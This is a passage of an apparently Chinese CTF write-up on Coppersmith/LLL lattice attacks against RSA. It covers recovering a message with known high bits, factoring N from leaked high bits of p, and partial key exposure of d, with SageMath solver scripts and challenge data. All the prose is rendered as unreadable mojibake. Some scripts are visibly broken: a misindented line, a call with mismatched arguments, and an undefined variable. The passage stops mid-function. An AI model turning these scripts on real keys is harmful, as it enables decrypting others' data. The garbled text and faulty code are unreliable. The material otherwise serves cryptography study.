python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å±•ç¤ºæ ¼çš„æ ·å¼</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">matrix_overview</span><span class="params">(B, bound)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(B.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">'%02d '</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> range(B.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">'0'</span> <span class="keyword">if</span> B[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">'X'</span></span><br><span class="line">            a += <span class="string">' '</span></span><br><span class="line">        <span class="keyword">if</span> B[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">'~'</span></span><br><span class="line">        <span class="keyword">print</span> (a)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coppersmith</span><span class="params">(pol, modulus, h, X)</span>:</span></span><br><span class="line">    <span class="comment"># è®¡ç®—çŸ©é˜µç»´åº¦</span></span><br><span class="line">    n = d * h</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># å°†å¤šé¡¹å¼è½¬åˆ°æ•´æ•°ç¯ä¸Š</span></span><br><span class="line">    polZ = pol.change_ring(ZZ)</span><br><span class="line">    x = polZ.parent().gen()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ„é€ ä¸Šæ–‡æ‰€è¿°latticeï¼ŒpolZ(x * X) å°±æ˜¯ç¯ä¸Šçš„å¤šé¡¹å¼f(X * x)ï¼Œæ‰€ä»¥è¿™é‡Œä¸ä¸Šæ–‡ä¸åŒçš„ç‚¹å°±åœ¨äºå¼•å…¥äº†å˜é‡xï¼Œä½†å˜é‡xåœ¨åé¢çš„çŸ©é˜µæ„é€ ä¸­ä¼šè¢«æŠ¹æ‰ã€‚</span></span><br><span class="line">    g = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(h):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(d):</span><br><span class="line">            g.append((x * X)**j * modulus**(h - <span class="number">1</span> - i) * polZ(x * X)**i)</span><br><span class="line">            </span><br><span class="line">    B = Matrix(ZZ, n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i+<span class="number">1</span>):</span><br><span class="line">            B[i, j] = g[i][j]</span><br><span class="line">            </span><br><span class="line">    <span class="comment"># å±•ç¤ºæ ¼çš„æ ·å¼</span></span><br><span class="line">matrix_overview(B,modulus^h)</span><br><span class="line">    <span class="comment"># LLLç®—æ³•</span></span><br><span class="line">    B = B.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å°†æœ€çŸ­å‘é‡è½¬åŒ–ä¸ºå¤šé¡¹å¼ï¼Œå¹¶ä¸”å»é™¤ç›¸åº”çš„X</span></span><br><span class="line">    new_pol = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        new_pol += x**i * B[<span class="number">0</span>, i] / X**i</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è§£æ–¹ç¨‹</span></span><br><span class="line">    potential_roots = new_pol.roots()</span><br><span class="line">    <span class="keyword">return</span> potential_roots</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">N =</span><br><span class="line">e =</span><br><span class="line">c =</span><br><span class="line">m =</span><br><span class="line">ZmodN = Zmod(N)</span><br><span class="line">P.&lt;x&gt; = PolynomialRing(ZmodN)</span><br><span class="line">f = (m + x)^e - c</span><br><span class="line">epsilon = <span class="number">1</span> / <span class="number">7</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ ¹æ®å…¬å¼è®¡ç®—å‚æ•°dã€hã€X</span></span><br><span class="line">d = f.degree()</span><br><span class="line">h = ceil(<span class="number">1</span> / (d * epsilon)) </span><br><span class="line">X = ceil(N**((<span class="number">1</span>/d) - epsilon))</span><br><span class="line"></span><br><span class="line">roots = (coppersmith(f, N, d, h, X))[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> root <span class="keyword">in</span> roots:</span><br><span class="line">    <span class="keyword">if</span> (m + root)^e %N  == c %N :</span><br><span class="line">        print(m + root)</span><br></pre></td></tr></table></figure><p>æ„é€ çš„æ ¼çš„æ ·å¼</p><p><img src="https://i.loli.net/2020/08/09/ItTcgQlP9pSw3Jo.png" alt="image-20200809181945882"></p><p>ä¸example3 æ˜¯ç±»ä¼¼çš„</p><p>ä½†å…¶å®sageå·²ç»é›†æˆäº†coppersmithçš„æ±‚æ ¹æ–¹æ³•ï¼Œå› æ­¤ç®€å•è°ƒç”¨ä¸€ä¸‹å‡½æ•°å°±å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚è¿™é‡Œä¹‹æ‰€ä»¥è¿™æ ·åšå…¶å®æ˜¯æƒ³æ˜ ç…§å‰æ–‡ï¼Œå±•ç¤ºä¸€ä¸‹åˆ©ç”¨coppersmithæ¥è§£å†³æ­¤ç±»é—®é¢˜çš„æ•´ä¸ªè¿‡ç¨‹ã€‚</p><p>åˆ©ç”¨ç°æˆæ–¹æ³•ç‰ˆexp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">N =</span><br><span class="line">e =</span><br><span class="line">c =</span><br><span class="line">m =</span><br><span class="line"></span><br><span class="line">ZmodN = Zmod(N)</span><br><span class="line">P.&lt;x&gt; = PolynomialRing(ZmodN)</span><br><span class="line">f = (m + x)^e - c</span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">1</span>)[<span class="number">0</span>]  <span class="comment"># è¿™é‡Œçš„Xé€‰å–ä¸åƒä¸Šæ–‡ç”¨çš„æ˜¯ä¸´ç•Œå€¼ï¼Œè€Œæ˜¯é€‰äº†ä¸€ä¸ªæˆ‘ä»¬æœªçŸ¥çš„xçš„æœ€å¤§å¯èƒ½å€¼ã€‚Xçš„é€‰å–å¹¶éä¸¥æ ¼ï¼Œä½†è‡³å°‘å¾—ä¿è¯æ¯”ä¸´ç•Œå€¼å°ã€‚</span></span><br><span class="line">print(<span class="string">"m:"</span>, m + x0)</span><br></pre></td></tr></table></figure><p>BTWï¼Œè¿™é‡Œæ³„éœ²çš„æ˜¯æ˜æ–‡çš„é«˜ä½ï¼Œå…¶å®è¿˜æœ‰æ³„éœ²ä½ä½ã€æ³„éœ²é«˜ä½ä½çš„æƒ…å†µã€‚ä½†æ¢æ±¤ä¸æ¢è¯ï¼Œæ— éæ˜¯ç”±$m+x$å˜æˆäº†$ m_h +x * 2^k + m_l$ã€‚</p><h3 id="ç¬¬äºŒå…³ï¼šFactoring-with-high-bits-known"><a href="#ç¬¬äºŒå…³ï¼šFactoring-with-high-bits-known" class="headerlink" title="ç¬¬äºŒå…³ï¼šFactoring with high bits known"></a>ç¬¬äºŒå…³ï¼šFactoring with high bits known</h3><p>å·²çŸ¥n,e,cï¼Œn=pqä¸”å·²çŸ¥pçš„é«˜ä½</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[+]Generating challenge <span class="number">2</span></span><br><span class="line">[+]n=<span class="number">0x5fe2743ec99568d645943147498849643932486590fb101f41c93ad7247161bc035d75dfb9e4b25209e26913098ecc1b7c4a92a47fb28452465d8b94e31844c4624da870140a48a28a0e6a3c6d9731b8488a63fd8ab9f5fe1ae86513c7444bb0aa39d44416b9cfa83c370f50c7a5a148a36823f0ddeed66ecf99117378c0640fL</span></span><br><span class="line">[+]e=<span class="number">65537</span></span><br><span class="line">[+]m=random.getrandbits(<span class="number">512</span>)</span><br><span class="line">[+]c=pow(m,e,n)=<span class="number">0x2639582bf7b22fd52a7a519673574e1212b675c9c10763ffcbcf5a86b61f07c4ea536e48dfbd4f3201cb2e18f2a0946959223b3f32bd5b3166d6cdd185ad946e543504dcc42ac9a24c03343bc8e4379997c722b12c66acaed6ad64d35f2fbcc8f4d899c1081d4211987841d1be082801a07014de89050b71e584827020934755L</span></span><br><span class="line">[+]((p&gt;&gt;<span class="number">128</span>)&lt;&lt;<span class="number">128</span>)=<span class="number">0xe4f16417011e6cc5ced2aad00d5865a0530f37c078dd22d942d0d0811c7053d973b621c4768a2a87a6d233be10db8e1a00000000000000000000000000000000L</span></span><br><span class="line">[-]long_to_bytes(m).encode(<span class="string">'hex'</span>)=</span><br></pre></td></tr></table></figure><p>è¿™ä¸€å…³æˆ‘ä»¬éœ€è¦å¼•å…¥ä¸€ä¸ªæ–°çš„å®šç†</p><h4 id="Theorem-3"><a href="#Theorem-3" class="headerlink" title="Theorem 3"></a>Theorem 3</h4><p>è®¾$N=p * q $å¹¶ä¸”æœ‰$p&lt;q&lt;2p$ï¼Œè®¾$0&lt;\epsilon&lt;\frac{1}{4}$ï¼Œå¦‚æœæ»¡è¶³å…³ç³»ï¼š$|p-pâ€™|â‰¤\frac{1}{2\sqrt2}N^{\frac{1}{4}-\epsilon}$ï¼Œé‚£ä¹ˆç»™å®šNå’Œpâ€™,æˆ‘ä»¬å°±å¯ä»¥åœ¨ä¸$log(N)$å’Œ$\frac{1}{\epsilon}$ç›¸å…³çš„æ—¶é—´å¤æ‚åº¦å†…åˆ†è§£Nã€‚</p><p>è¿™é‡Œæˆ‘å°±ä¸å†ç»™å‡ºä»¤äººå¤´å¤§çš„è¯æ˜äº†ã€‚ç›´æ¥ç»™å‡ºä¸€ä¸ªä¾‹å­ï¼Œä½†æ˜¯æ˜¾ç„¶ï¼Œç”±äºæ¡ä»¶çš„æ”¹å˜ï¼Œè¿™ä¸ªæ ¼å­çš„æ„é€ ä¹Ÿä¼šä¸ä¹‹å‰çš„æ ¼å­ä¸åŒã€‚</p><h4 id="example-4"><a href="#example-4" class="headerlink" title="example 4"></a>example 4</h4><p>è®¾$N=16803551ï¼Œpâ€™=2830 ï¼Œ X=10.$</p><p>æˆ‘ä»¬è®¾$F(x)=(x+pâ€™)$ï¼Œå¹¶ä¸”è€ƒè™‘å¤šé¡¹å¼ï¼š$N, F(x)ï¼ŒxF(x)=(x^2+pâ€™x)ï¼Œx^2F(x)$ã€‚ç„¶åæ„é€ æ ¼</p><p>$B = \begin{bmatrix} N&amp;0&amp;0&amp;0 \newline pâ€™&amp;X&amp;0&amp;0 \newline  0&amp;pâ€™X&amp;X^{2}&amp;0 \newline 0 &amp;0&amp;pX^2&amp;X^3\end{bmatrix}$</p><p>LLLè§„çº¦åå¾—åˆ°ç¬¬ä¸€è¡Œçš„SVPä¸ºï¼ˆ105ï¼Œ-1200ï¼Œ800ï¼Œ1000ï¼‰ï¼Œå»é™¤Xå¯ä»¥å¾—åˆ°</p><p>$G(x)=x^3+8x^2-120x+105$ï¼›è§£æ–¹ç¨‹å¯ä»¥å¾—åˆ°$x=7$ï¼Œæ£€æŸ¥ä¸€ä¸‹ç¡®å® $2387|N$</p><p>ã€è¿™é‡Œçš„$N$ä¹Ÿè®¸æ˜¾å¾—çªå…€ï¼ŒæŠŠå®ƒçœ‹ä½œæ˜¯$k * p$ä¹Ÿè®¸ä¼šå¥½ç†è§£äº›ï¼šæ‰€é€‰å–çš„å¤šé¡¹å¼å¸¦å…¥æ­£è§£$x$æ—¶å‡åœ¨æ¨¡$p$ä¸‹ä¸0åŒä½™ã€‚ã€‘</p><p>é™¤äº†è¿™æ ·æ„é€ æ ¼å­ï¼Œé€šè¿‡æŸ¥é˜…ç½‘ä¸Šå…³äºè¿™é“é¢˜çš„é¢˜è§£å¯ä»¥å‘ç°å¦ä¸€ç§æ ¼å­çš„æ„é€ ã€‚æˆ‘ä»¬è¿™é‡Œæ˜¯â€œx-shiftâ€äº†ä¸‰æ¬¡ï¼Œå¦å¤–é‚£ç§æ˜¯å…ˆæå‡æ¬¡æ•°ï¼Œç„¶åå†â€œx-shiftâ€ï¼Œå…·ä½“ç”¨äº†è¿™å…«ä¸ªå¤šé¡¹å¼ï¼š$N^4, N^3F(x), N^2F(x)^2,NF(x)^3,F(x)^4,xF(x)^4,x^2F(x)^4,x^3F(x)^4$</p><p>æ ¼å­çš„æ ·å¼ï¼š</p><p><img src="https://i.loli.net/2020/08/11/voZQpe9TkdKnRNm.png" alt="image-20200811225724892"></p><p>ä¹‹æ‰€ä»¥è¿™ä¹ˆé€‰ä¹Ÿæ˜¯è¿™é‡Œæ–°å¼•å…¥äº†ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯betaï¼Œä¸€ä¸ªæ˜¯tï¼Œbetaæ˜¯æœªçŸ¥pä¸å·²çŸ¥NæŒ‡æ•°å…³ç³»ï¼Œè¿™é‡Œå°±æ˜¯0.4ï¼Œå› ä¸º$pâ‰ˆN^{0.4}$ï¼Œã€å…¶å®å¯ä»¥æ˜¯0.5ï¼Œä½†æˆ‘ä»¬å¹¶ä¸ç¡®å®š$p,q$çš„å¤§å°å…³ç³»ï¼Œä¿é™©èµ·è§ç”¨0.4ã€‘tçš„å…·ä½“å–å€¼ä¸betaç›¸å…³ï¼Œå¦å¤–è¿™é‡Œçš„hçš„å–å€¼ä¹Ÿä¸betaæœ‰å…³ï¼ŒXçš„å–å€¼ä¹Ÿä¸ä¸Šé¢çš„å®šç†æ‰€è¿°ä¸åŒã€‚</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å±•ç¤ºæ ¼çš„æ ·å¼</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">matrix_overview</span><span class="params">(B, bound)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(B.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">'%02d '</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> range(B.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">'0'</span> <span class="keyword">if</span> B[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">'X'</span></span><br><span class="line">            a += <span class="string">' '</span></span><br><span class="line">        <span class="keyword">if</span> B[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">'~'</span></span><br><span class="line">        <span class="keyword">print</span> (a)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coppersmith</span><span class="params">(pol, modulus, beta, h, t, X)</span>:</span></span><br><span class="line">    <span class="comment"># è®¡ç®—çŸ©é˜µç»´åº¦</span></span><br><span class="line">    n = d * h + t</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># å°†å¤šé¡¹å¼è½¬åˆ°æ•´æ•°ç¯ä¸Š</span></span><br><span class="line">    polZ = pol.change_ring(ZZ)</span><br><span class="line">    x = polZ.parent().gen()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ„é€ ä¸Šæ–‡æ‰€è¿°latticeï¼ŒpolZ(x * X) å°±æ˜¯ç¯ä¸Šçš„å¤šé¡¹å¼f(X * x)ï¼Œæ‰€ä»¥è¿™é‡Œä¸ä¸Šæ–‡ä¸åŒçš„ç‚¹å°±åœ¨äºå¼•å…¥äº†å˜é‡xï¼Œä½†å˜é‡xåœ¨åé¢çš„çŸ©é˜µæ„é€ ä¸­ä¼šè¢«æŠ¹æ‰ã€‚</span></span><br><span class="line">    g = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(h):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(d):</span><br><span class="line">            g.append((x * X)**j * modulus**(h - i) * polZ(x * X)**i)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(t):</span><br><span class="line">        g.append((x * X)**i * polZ(x * X)**h)</span><br><span class="line">    <span class="comment"># æ„é€ æ ¼B</span></span><br><span class="line">    B = Matrix(ZZ, n)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i+<span class="number">1</span>):</span><br><span class="line">            B[i, j] = g[i][j]</span><br><span class="line">    <span class="comment"># å±•ç¤ºæ ¼çš„æ ·å¼</span></span><br><span class="line">    matrix_overview(B, modulus^h)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    B = B.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å°†æœ€çŸ­å‘é‡è½¬åŒ–ä¸ºå¤šé¡¹å¼ï¼Œå¹¶ä¸”å»é™¤ç›¸åº”çš„X </span></span><br><span class="line">    new_pol = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        new_pol += x**i * B[<span class="number">0</span>, i] / X**i</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è§£æ–¹ç¨‹</span></span><br><span class="line">    potential_roots = new_pol.roots()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># æ£€æŸ¥æ ¹</span></span><br><span class="line">    roots = []</span><br><span class="line">    <span class="keyword">for</span> root <span class="keyword">in</span> potential_roots:</span><br><span class="line">        <span class="keyword">if</span> root[<span class="number">0</span>].is_integer():</span><br><span class="line">            result = polZ(ZZ(root[<span class="number">0</span>]))</span><br><span class="line">            <span class="keyword">if</span> gcd(modulus, result) &gt;= modulus^beta:</span><br><span class="line">                print(<span class="string">"p: "</span>,(gcd(modulus, result)))</span><br><span class="line">                roots.append(ZZ(root[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">N = </span><br><span class="line">ZmodN = Zmod(N)</span><br><span class="line">P.&lt;x&gt; = PolynomialRing(ZmodN)</span><br><span class="line">pbar = </span><br><span class="line">f = pbar + x</span><br><span class="line">beta = <span class="number">0.4</span></span><br><span class="line">d = f.degree()</span><br><span class="line">epsilon = beta / <span class="number">7</span></span><br><span class="line">h = ceil(beta**<span class="number">2</span> / (d * epsilon))</span><br><span class="line">t = floor(d * h * ((<span class="number">1</span>/beta) - <span class="number">1</span>))</span><br><span class="line">X = ceil(N**((beta**<span class="number">2</span>/d) - epsilon)) </span><br><span class="line">roots = coppersmith(f, N, beta, h, t, X)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè„šæœ¬å…¶å®ä¹Ÿå¯ä»¥ç”¨åœ¨ç¬¬ä¸€å…³ï¼Œåªè¦å°†betaæ”¹æˆ1ï¼Œå†å¸¦å…¥ç›¸åº”çš„å¤šé¡¹å¼å’Œæ•°æ®å°±å¯ä»¥äº†ã€‚</p><p>ç›¸å…³çš„paperå’ŒåŸè„šæœ¬åœ¨<a href="https://github.com/mimoo/RSA-and-LLL-attacks/" target="_blank" rel="noopener">github</a>ï¼Œæœ‰å…´è¶£çš„å¸ˆå‚…å¯ä»¥ç ”ç©¶ç ”ç©¶ã€‚</p><p>åŒæ ·ï¼Œåˆ©ç”¨ç°æˆå‡½æ•°ç‰ˆexp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">N = </span><br><span class="line">pbar = </span><br><span class="line">ZmodN = Zmod(N)</span><br><span class="line">P.&lt;x&gt; = PolynomialRing(ZmodN)</span><br><span class="line">f = pbar + x</span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)</span><br><span class="line">p =  pbar + x0</span><br><span class="line">print(<span class="string">"p: "</span>, p)</span><br></pre></td></tr></table></figure><p>BTWï¼ŒåŒç¬¬ä¸€å…³ä¸€æ ·ï¼Œè¿™é‡Œçš„pæ³„éœ²äº†é«˜ä½ï¼Œä½†ä¸pæ³„éœ²äº†ä½ä½çš„æƒ…å†µï¼Œæ— å·®ã€‚</p><h3 id="ç¬¬ä¸‰å…³ï¼šPartial-Key-Exposure-Attack"><a href="#ç¬¬ä¸‰å…³ï¼šPartial-Key-Exposure-Attack" class="headerlink" title="ç¬¬ä¸‰å…³ï¼šPartial Key Exposure Attack"></a>ç¬¬ä¸‰å…³ï¼šPartial Key Exposure Attack</h3><p>å·²çŸ¥n,e=3,cï¼Œdçš„ä½512bitå·²çŸ¥ ã€nçš„é•¿åº¦ä¸º1023ã€‘</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[+]Generating challenge <span class="number">3</span></span><br><span class="line">[+]n=<span class="number">0x6f209521a941ddde2294745f53711ae6a7a59aa4d0735f47328ac03e26a4e092bb1c4c885029950f52b1e071597dc6e6d5129afbdb4688ad0479d6f9655dafef915da0a3f5114989cb474a13a9a4a4293fd447739b3cc2b0a3966f21617f057e6c199c5fd4d11ce78fdf9112f53446578b6cfd2c405eb0d3389cd3965636f719L</span></span><br><span class="line">[+]e=<span class="number">3</span></span><br><span class="line">[+]m=random.getrandbits(<span class="number">512</span>)</span><br><span class="line">[+]c=pow(m,e,n)=<span class="number">0x6126eaf34233341016966d50c54c6f7401e98f2015bcbdc4d56f93f0c48590fcd8ee784521c503be322c0848f998dc3a6d630bc1043a4162467c4b069b6c0e186061ed2187d0b2d44e9797ce62569d2dab58d183d69b9d110369a8d690361b22223e34e65e51868646d0ebf697b10e21a97d028833719e87c1584d2564f21167L</span></span><br><span class="line">[+]d=invmod(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">[+]d&amp;((<span class="number">1</span>&lt;&lt;<span class="number">512</span>)<span class="number">-1</span>)=<span class="number">0x1d8f1499c4f6d90716d89f76833823e8fca4dd4034f17157e4fd9f6f070e1526f3b4fa3fe507d645ec848e4d7ff3728eb8df04b72849feabaa3425f9fc510ec3L</span></span><br><span class="line">[-]long_to_bytes(m).encode(<span class="string">'hex'</span>)=</span><br></pre></td></tr></table></figure><p>æ ¹æ®RSAç›¸å…³å‚æ•°æˆ‘ä»¬å¯ä»¥çŸ¥é“çš„æ˜¯$e * d = k\phi(n)+1$ï¼Œ</p><p>æˆ‘ä»¬è®¾ $s = p + q$ï¼Œ</p><p>åˆ™æœ‰$e *d = k(n-s+1)+1$ã€‚</p><p>å†è®¾$d$çš„ä½ä½ä¸º$d_0$ ï¼Œä¸$n^{\frac{1}{2}}$çº¦ä¸ºä¸€ä¸ªbité•¿åº¦çº§åˆ«,</p><p>è®¾nçš„bité•¿åº¦ä¸º$L$ï¼Œç”±$e *d = k(n-s+1)+1$æˆ‘ä»¬å¾ˆå®¹æ˜“èƒ½å¾—åˆ°</p><p>$e * d_0 \equiv k(n-s+1)+1 \pmod{2^{\frac{L}{2}}}$     â‘ ï¼Œ</p><p>æ¥ä¸‹æ¥çš„æ“ä½œå¯èƒ½æœ‰ç‚¹è·³è·ƒï¼šè¿™é‡Œæˆ‘ä»¬æƒ³æ¶ˆå…ƒï¼ŒæŠŠä¸Šå¼çš„sç»™æ¶ˆå»ï¼Œåˆå› ä¸ºæˆ‘ä»¬æœ‰</p><p>$p^2-sp+n = p^2-p^2-pq+n=0$    â‘¡</p><p>$p * â‘ -k * â‘¡=ed_0p\equiv kpn-kps+kp+p-kp^2+kps-kn\equiv kpn + kp+p-kp^2-kn \pmod{2^{\frac{L}{2}}}$</p><p>è¿™æ ·å¼å­å°±åªæœ‰ä¸€ä¸ªæœªçŸ¥æ•°$p$äº†ï¼Œå³è§£åŒä½™å¼æ–¹ç¨‹ï¼š</p><p>$ed_0x\equiv  knx + kx+x-kx^2-kn \pmod{2^{\frac{L}{2}}}$ </p><p>æˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°$p$çš„ä½ä½$p_0$äº†ã€‚</p><p>ä¸å¯¹ï¼Œæˆ‘ä»¬ä¼¼ä¹æ¼äº†$k$çš„å€¼ï¼Œä½†æ˜¯ç”±æœ€åˆçš„$e*d = k\phi(n)+1$æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œ$d&lt;\phi(n)$ï¼Œé‚£è‚¯å®šæœ‰$k&lt;e$ï¼Œè€Œè¿™é‡Œ$e=3$ï¼Œæ‰€ä»¥çˆ†è¿™ä¸ª$k$å°±å®Œäº‹ã€‚</p><p>ç„¶åæˆ‘ä»¬å†ç”¨ç¬¬äºŒå…³çš„è„šæœ¬ï¼Œæ¢­ä»–å°±å®Œäº‹ã€‚</p><p>expæºè‡ª</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover_p</span><span class="params">(p0, n)</span>:</span></span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    nbits = n.nbits()</span><br><span class="line">    p0bits = p0.nbits()</span><br><span class="line">    f = <span class="number">2</span>^p0bits*x + p0</span><br><span class="line">    f = f.monic()</span><br><span class="line">    roots = f.small_roots(X=<span class="number">2</span>^(nbits//<span class="number">2</span>-p0bits), beta=<span class="number">0.4</span>)  </span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        x0 = roots[<span class="number">0</span>]</span><br><span class="line">        p = gcd(<span class="number">2</span>^d0bits*x0 + p0, n)</span><br><span class="line">        <span class="keyword">return</span> ZZ(p)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_p0</span><span class="params">(d0, 